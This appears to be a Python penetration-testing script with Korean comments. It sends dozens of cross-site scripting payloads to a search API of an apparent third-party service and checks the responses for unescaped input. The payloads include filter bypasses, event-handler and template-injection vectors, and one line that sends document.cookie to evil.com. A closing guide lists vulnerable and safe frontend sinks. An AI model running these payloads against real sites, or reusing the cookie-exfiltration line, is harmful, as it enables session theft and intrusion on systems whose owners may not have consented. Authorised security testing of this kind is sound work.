"""
대상 서비스 API XSS 심층 테스트
- Stored XSS 가능성
- 다양한 XSS 벡터 테스트
- 응답 내 이스케이프 여부 확인
"""

import requests
import json

URL = "https://www.example-target.com/api_renewal/ko/expert_search"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/json",
    "Referer": "https://www.example-target.com/service"
}

BASE_PAYLOAD = {
    "query_string": "AD : ( 20250101 ~ 20250201 )",
    "search_type": "general",
    "page": 1,
    "size": 10,
    "checkbox_registration_status_filter": ["출원"],
    "checkbox_trademark_types_filter": ["문자"]
}


def test_xss(test_name, xss_payload, field="query_string"):
    """XSS 테스트 실행 및 응답 분석"""
    print(f"\n{'='*70}")
    print(f"테스트: {test_name}")
    print(f"페이로드: {xss_payload[:80]}...")
    print(f"{'='*70}")
    
    payload = BASE_PAYLOAD.copy()
    
    if field == "query_string":
        payload['query_string'] = xss_payload
    else:
        payload[field] = xss_payload
    
    try:
        response = requests.post(URL, headers=HEADERS, json=payload, timeout=15)
        
        print(f"상태 코드: {response.status_code}")
        
        # 응답에서 XSS 페이로드가 어떻게 처리되었는지 확인
        response_text = response.text
        
        # 원본 페이로드가 그대로 있는지 확인
        if xss_payload in response_text:
            print(f"⚠️  경고: 페이로드가 이스케이프 없이 그대로 반환됨!")
            print(f"   → Reflected XSS 가능성 있음")
        
        # HTML 엔티티로 이스케이프 되었는지 확인
        escaped_checks = [
            ("&lt;", "<"),
            ("&gt;", ">"),
            ("&quot;", '"'),
            ("&#x27;", "'"),
            ("&amp;", "&"),
        ]
        
        is_escaped = False
        for escaped, original in escaped_checks:
            if escaped in response_text and original in xss_payload:
                is_escaped = True
                print(f"✓ '{original}' → '{escaped}' 이스케이프 확인")
        
        if not is_escaped and any(c in xss_payload for c in '<>"\''):
            print(f"⚠️  특수문자가 이스케이프되지 않음")
        
        # 응답 구조 분석
        try:
            data = response.json()
            
            # request_data에서 query_string 확인
            if 'request_data' in data:
                returned_query = data['request_data'].get('query_string', '')
                print(f"\n반환된 query_string:")
                print(f"  {returned_query}")
                
                if returned_query == xss_payload:
                    print(f"  → 입력값이 변환 없이 그대로 반환됨")
            
            # message 필드 확인
            if 'message' in data:
                print(f"\nmessage 필드: {data['message']}")
                
        except json.JSONDecodeError:
            print(f"JSON 파싱 실패")
            
    except Exception as e:
        print(f"에러: {str(e)}")


def run_xss_tests():
    """다양한 XSS 벡터 테스트"""
    
    # ============================================
    # 1. 기본 XSS 벡터
    # ============================================
    print("\n" + "#"*70)
    print("# 1. 기본 XSS 벡터")
    print("#"*70)
    
    basic_xss = [
        ("<script>alert('XSS')</script>", "기본 script 태그"),
        ("<script>alert(document.cookie)</script>", "쿠키 탈취 시도"),
        ("<script>fetch('https://evil.com?c='+document.cookie)</script>", "쿠키 전송 시도"),
        ("<img src=x onerror=alert('XSS')>", "img onerror"),
        ("<svg onload=alert('XSS')>", "svg onload"),
        ("<body onload=alert('XSS')>", "body onload"),
        ("<iframe src='javascript:alert(1)'>", "iframe javascript"),
        ("<a href='javascript:alert(1)'>click</a>", "a href javascript"),
    ]
    
    for payload, name in basic_xss:
        test_xss(name, payload)
    
    # ============================================
    # 2. 이스케이프 우회 시도
    # ============================================
    print("\n" + "#"*70)
    print("# 2. 이스케이프 우회 시도")
    print("#"*70)
    
    bypass_xss = [
        ("<ScRiPt>alert('XSS')</ScRiPt>", "대소문자 혼합"),
        ("<scr<script>ipt>alert('XSS')</scr</script>ipt>", "중첩 태그"),
        ("<script>alert(String.fromCharCode(88,83,83))</script>", "문자 코드 변환"),
        ("\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e", "Hex 인코딩"),
        ("<script>alert`XSS`</script>", "템플릿 리터럴"),
        ("<script>alert(/XSS/.source)</script>", "정규식 source"),
        ("'-alert('XSS')-'", "속성 탈출"),
        ('"-alert("XSS")-"', "속성 탈출 (더블쿼트)"),
    ]
    
    for payload, name in bypass_xss:
        test_xss(name, payload)
    
    # ============================================
    # 3. 이벤트 핸들러 기반 XSS
    # ============================================
    print("\n" + "#"*70)
    print("# 3. 이벤트 핸들러 XSS")
    print("#"*70)
    
    event_xss = [
        ("<div onmouseover=alert('XSS')>hover me</div>", "onmouseover"),
        ("<input onfocus=alert('XSS') autofocus>", "onfocus autofocus"),
        ("<marquee onstart=alert('XSS')>", "marquee onstart"),
        ("<video><source onerror=alert('XSS')>", "video source onerror"),
        ("<audio src=x onerror=alert('XSS')>", "audio onerror"),
        ("<details open ontoggle=alert('XSS')>", "details ontoggle"),
        ("<object data='javascript:alert(1)'>", "object data"),
        ("<embed src='javascript:alert(1)'>", "embed src"),
    ]
    
    for payload, name in event_xss:
        test_xss(name, payload)
    
    # ============================================
    # 4. DOM 기반 XSS 벡터
    # ============================================
    print("\n" + "#"*70)
    print("# 4. DOM 기반 XSS 벡터")
    print("#"*70)
    
    dom_xss = [
        ("{{constructor.constructor('alert(1)')()}}", "Angular/Vue 템플릿 인젝션"),
        ("${alert(1)}", "템플릿 리터럴 인젝션"),
        ("#{alert(1)}", "Ruby 템플릿 인젝션"),
        ("<%= alert(1) %>", "ERB 템플릿"),
        ("{{7*7}}", "템플릿 엔진 테스트 (결과: 49면 취약)"),
        ("${7*7}", "템플릿 리터럴 테스트"),
        ("[[${7*7}]]", "Thymeleaf 템플릿"),
    ]
    
    for payload, name in dom_xss:
        test_xss(name, payload)
    
    # ============================================
    # 5. Unicode/인코딩 우회
    # ============================================
    print("\n" + "#"*70)
    print("# 5. Unicode/인코딩 우회")
    print("#"*70)
    
    encoding_xss = [
        ("<script>alert('XSS')</script>".encode('utf-16').decode('utf-16'), "UTF-16"),
        ("\u003cscript\u003ealert('XSS')\u003c/script\u003e", "Unicode 이스케이프"),
        ("&#60;script&#62;alert('XSS')&#60;/script&#62;", "HTML 엔티티 (10진수)"),
        ("&#x3c;script&#x3e;alert('XSS')&#x3c;/script&#x3e;", "HTML 엔티티 (16진수)"),
        ("%3Cscript%3Ealert('XSS')%3C/script%3E", "URL 인코딩"),
        ("<script>alert(\u0027XSS\u0027)</script>", "Unicode 쿼트"),
    ]
    
    for payload, name in encoding_xss:
        test_xss(name, payload)
    
    # ============================================
    # 6. 다른 필드 테스트
    # ============================================
    print("\n" + "#"*70)
    print("# 6. 다른 필드에 XSS 주입")
    print("#"*70)
    
    # search_type 필드
    payload = BASE_PAYLOAD.copy()
    payload['search_type'] = "<script>alert('XSS')</script>"
    print(f"\n{'='*70}")
    print(f"테스트: search_type 필드 XSS")
    print(f"{'='*70}")
    response = requests.post(URL, headers=HEADERS, json=payload, timeout=15)
    print(f"상태 코드: {response.status_code}")
    print(f"응답: {response.text[:500]}")
    
    # checkbox_registration_status_filter 필드
    payload = BASE_PAYLOAD.copy()
    payload['checkbox_registration_status_filter'] = ["<script>alert('XSS')</script>"]
    print(f"\n{'='*70}")
    print(f"테스트: checkbox_registration_status_filter 필드 XSS")
    print(f"{'='*70}")
    response = requests.post(URL, headers=HEADERS, json=payload, timeout=15)
    print(f"상태 코드: {response.status_code}")
    print(f"응답: {response.text[:500]}")


def check_frontend_vulnerability():
    """프론트엔드 XSS 취약점 확인을 위한 가이드"""
    print("\n" + "="*70)
    print("프론트엔드 XSS 취약점 확인 가이드")
    print("="*70)
    print("""
API 응답에서 query_string이 이스케이프 없이 반환되고 있습니다.
프론트엔드에서 이 값을 어떻게 처리하는지 확인이 필요합니다.

[확인해야 할 코드 패턴]

1. 위험한 패턴 (XSS 취약):
   - element.innerHTML = response.request_data.query_string
   - document.write(response.request_data.query_string)
   - $(selector).html(response.request_data.query_string)
   - v-html="queryString" (Vue.js)
   - dangerouslySetInnerHTML={{__html: queryString}} (React)

2. 안전한 패턴:
   - element.textContent = response.request_data.query_string
   - $(selector).text(response.request_data.query_string)
   - {{ queryString }} (Vue.js - 자동 이스케이프)
   - {queryString} (React - 자동 이스케이프)

[테스트 방법]

1. 브라우저에서 직접 테스트:
   - 검색창에 <script>alert('XSS')</script> 입력
   - 검색 결과 페이지에서 alert 창이 뜨는지 확인
   
2. 개발자 도구로 확인:
   - Elements 탭에서 검색어가 표시되는 요소 찾기
   - HTML로 삽입되었는지, 텍스트로 삽입되었는지 확인
""")


if __name__ == "__main__":
    print("="*70)
    print("대상 서비스 API XSS 심층 테스트")
    print("="*70)
    
    run_xss_tests()
    check_frontend_vulnerability()
    
    print("\n" + "="*70)
    print("테스트 완료!")
    print("="*70)